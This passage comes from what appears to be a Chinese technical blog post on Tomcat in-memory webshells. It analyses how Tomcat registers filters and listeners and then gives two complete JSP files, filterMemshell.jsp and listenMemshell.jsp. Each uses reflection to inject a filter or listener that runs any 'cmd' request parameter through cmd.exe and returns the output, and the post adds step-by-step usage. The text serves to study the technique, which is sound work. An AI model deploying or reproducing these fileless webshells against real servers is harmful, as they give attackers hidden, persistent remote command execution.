class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(<span class="built_in">this</span>, entry.getValue());</span><br><span class="line">                <span class="comment">// 这里可以往filterConfigs中添加filterConfig</span></span><br><span class="line">                filterConfigs.put(name, filterConfig);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                t = ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                getLogger().error(sm.getString(<span class="string">&quot;standardContext.filterStart&quot;</span>, name), t);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ok;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法在Tomcat启动时会运行，遍历filterDefs，然后根据filterDefs中的值创建filterConfig，然后将filterConfig添加到filterConfigs中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230917213136.png"><br><strong>filterDefs</strong><br>在StandardContext中添加filterDef的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterDef</span><span class="params">(FilterDef filterDef)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (filterDefs) &#123;</span><br><span class="line">        filterDefs.put(filterDef.getFilterName(), filterDef);</span><br><span class="line">    &#125;</span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addFilterDef&quot;</span>, filterDef);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而filterDefs是从配置文件中解析得来的</p>
<h2 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h2><p>filterMemshell.jsp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">Created by IntelliJ IDEA.</span><br><span class="line">User: DiliLearngent</span><br><span class="line">Date: <span class="number">2023</span>/<span class="number">9</span>/<span class="number">18</span></span><br><span class="line">Time: <span class="number">16</span>:<span class="number">30</span></span><br><span class="line">To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取应用程序上下文对象(ApplicationContextFacade)</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取ApplicationContextFacade的context属性，即ApplicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取ApplicationContext的context属性，即StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standContextField.get(applicationContext);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取StandardContext的filterConfigs属性，即filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建my filter 需要先判断是否已经存在同名的filter</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">myFiltername</span> <span class="operator">=</span> <span class="string">&quot;filtershell&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(filterConfigs.get(myFiltername) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">myFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">                Filter.<span class="built_in">super</span>.init(filterConfig);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="comment">// shell</span></span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/C&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">                Filter.<span class="built_in">super</span>.destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建filterDef对象</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(myFilter);</span><br><span class="line">        filterDef.setFilterName(myFiltername);</span><br><span class="line">        filterDef.setFilterClass(myFilter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterDef添加至filterDefs</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建filterMap</span></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(myFiltername);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterMap添加至filterMaps(第一位)</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建ApplicationFilterConfig对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(myFiltername, filterConfig);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://localhost:8090/Tomcat_memshell_Web_exploded/filterMemshell.jsp">http://localhost:8090/Tomcat_memshell_Web_exploded/filterMemshell.jsp</a><br>执行完第一行得到ApplicationContextFacade对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230918204054.png"><br>执行到最后<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230918204407.png"><br>成功将自定义的filter添加到filterConfigs、filterMaps、filterDefs中<br>此时内存马成功写入，接下来就是访问相应的url生成filterChain，调用自定义的filter，触发命令执行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230918210312.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/yyhuni/p/15516136.html">Tomcat 内存马（二）Filter型</a><br><a href="http://wjlshare.com/archives/1529">Tomcat 内存马学习(一)：Filter型</a><br><a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a><br><a href="https://su18.org/post/memory-shell/#filter-%E5%86%85%E5%AD%98%E9%A9%AC">JavaWeb 内存马一周目通关攻略</a><br><a href="https://www.cnblogs.com/nice0e3/p/14622879.html#filter%E9%93%BE%E5%88%86%E6%9E%90">Java安全之基于Tomcat实现内存马</a><br><a href="https://www.cnblogs.com/zpchcbd/p/14814385.html">Java Filter型内存马的学习与实践</a><br><a href="https://yzddmr6.com/posts/tomcat-context/">关于Tomcat中的三个Context的理解</a></p>
<h1 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>常用监听器：</p>
<ul>
<li>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</li>
<li>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</li>
<li>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</li>
<li>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</li>
<li>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</li>
<li>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</li>
</ul>
<p>这些类接口都是java.util.EventListener的子接口，以ServletRequestListener为例，它的接口定义如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ServletRequestListener</span> <span class="keyword">extends</span> <span class="title class_">EventListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Receives notification that a ServletRequest is about to go out</span></span><br><span class="line"><span class="comment">     * of scope of the web application.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sre the ServletRequestEvent containing the ServletRequest</span></span><br><span class="line"><span class="comment">     * and the ServletContext representing the web application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Receives notification that a ServletRequest is about to come</span></span><br><span class="line"><span class="comment">     * into scope of the web application.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sre the ServletRequestEvent containing the ServletRequest</span></span><br><span class="line"><span class="comment">     * and the ServletContext representing the web application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个监听器用于监听ServletRequest的创建和销毁，当ServletRequest创建时，会调用requestInitialized方法，当ServletRequest销毁时，会调用requestDestroyed方法。</p>
<h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><p>创建HelloListener类，实现ServletContextListener接口，重写contextInitialized方法和contextDestroyed方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke ServletRequestListener requestDestroyed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke ServletRequestListener requestInitialized!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改web.xml，添加listener配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.example.listener.HelloListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Listener流程分析"><a href="#Listener流程分析" class="headerlink" title="Listener流程分析"></a>Listener流程分析</h2><p>在自定义的requestInitialized处下断点<br>函数调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">requestInitialized:<span class="number">14</span>, HelloListener (org.example.listener)</span><br><span class="line">fireRequestInitEvent:<span class="number">5663</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">116</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">673</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">389</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">926</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1791</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>在StandardHostValve的invoke方法中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230919141754.png"><br>进入StandardContext的fireRequestInitEvent方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230919142300.png"><br>在这个方法中调用listener的requestInitialized方法<br>需要考虑两个问题，第一：instances怎么来的？第二：requestInitialized方法中的参数event怎么来的？<br>第一个问题：在fireRequestInitEvent方法中，第一行就是获取instances，如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object instances[] = getApplicationEventListeners();</span><br></pre></td></tr></table></figure>

<p>查看此函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以listener存放在applicationEventListenersList属性中，所以在StandardContext中找到能够向applicationEventListenersList添加listener的方法<br>方法1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add a listener to the end of the list of initialized application event listeners.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> listener The listener to add</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">    applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法2：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125; Note that this implementation is not thread safe. If two threads call this method concurrently, the</span></span><br><span class="line"><span class="comment"> * result may be either set of listeners or a the union of both.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setApplicationEventListeners</span><span class="params">(Object listeners[])</span> &#123;</span><br><span class="line">    applicationEventListenersList.clear();</span><br><span class="line">    <span class="keyword">if</span> (listeners != <span class="literal">null</span> &amp;&amp; listeners.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        applicationEventListenersList.addAll(Arrays.asList(listeners));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二个问题：event如何构造？在fireRequestInitEvent方法中由如下代码构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletRequestEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestEvent</span>(getServletContext(), request);</span><br></pre></td></tr></table></figure>

<h2 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h2><p>listenMemshell.jsp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: DiliLearngent</span><br><span class="line">  Date: <span class="number">2023</span>/<span class="number">9</span>/<span class="number">19</span></span><br><span class="line">  Time: <span class="number">14</span>:<span class="number">41</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/C&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestFiled</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestFiled.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">MyListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">    context.addApplicationEventListener(listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>先访问listenMemshell.jsp生成内存马，然后访问任意路径，加上cmd参数即可命令执行</p>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/yyhuni/p/tomcat_memshell.html">Tomcat 内存马（一）Listener型</a><br><a href="https://su18.org/post/memory-shell/#listener-%E5%86%85%E5%AD%98%E9%A9%AC">JavaWeb 内存马一周目通关攻略</a></p>
<h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h2 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h2><p>创建HelloServlet类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(value = &quot;/hello&quot;, name = &quot;hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">        System.out.println(<span class="string">&quot;doget&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">        System.out.println(<span class="string">&quot;dopost&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web.xml中添加配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.example.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在doGet方法下断点，调试<br>函数调用栈：</p>
